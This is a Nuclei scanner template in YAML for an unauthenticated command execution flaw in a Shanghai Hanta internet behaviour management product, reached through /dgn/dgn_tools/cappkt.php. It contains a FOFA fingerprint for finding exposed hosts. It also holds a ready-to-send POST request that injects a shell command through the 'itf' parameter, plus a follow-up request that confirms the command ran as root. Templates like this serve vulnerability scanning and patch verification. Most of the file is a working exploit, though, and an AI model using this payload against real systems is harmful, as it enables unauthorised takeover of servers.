id: hanta-dgn_dgn_toolscappkt-rce

info:
  name: 上海汉塔网络科技有限公司上网行为管理系统/dgn/dgn_tools/cappkt.php命令执行
  author: HuanXiong
  severity: critical
  description: |-
    fofa: icon_hash="-1991205638"
    上海汉塔网络科技有限公司上网行为管理系统/dgn/dgn_tools/cappkt.php 接口处存在远程代码执行漏洞，未经身份验证的攻击者可通过该漏洞获取服务器权限。经过分析和研判，该漏洞利用难度低，可导致远程代码执行，建议尽快修复。
  reference:
    - 
  tags: RCE

variables:
  username: "{{to_lower(rand_base(6))}}" # 从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /dgn/dgn_tools/cappkt.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-U    S;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Length: 15

        itf=;id > {{username}}.txt;

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "ok"
        part: body

  - raw:
      - |
        GET /dgn/dgn_tools/{{username}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uid=0(root) gid=0(root)"
        part: body
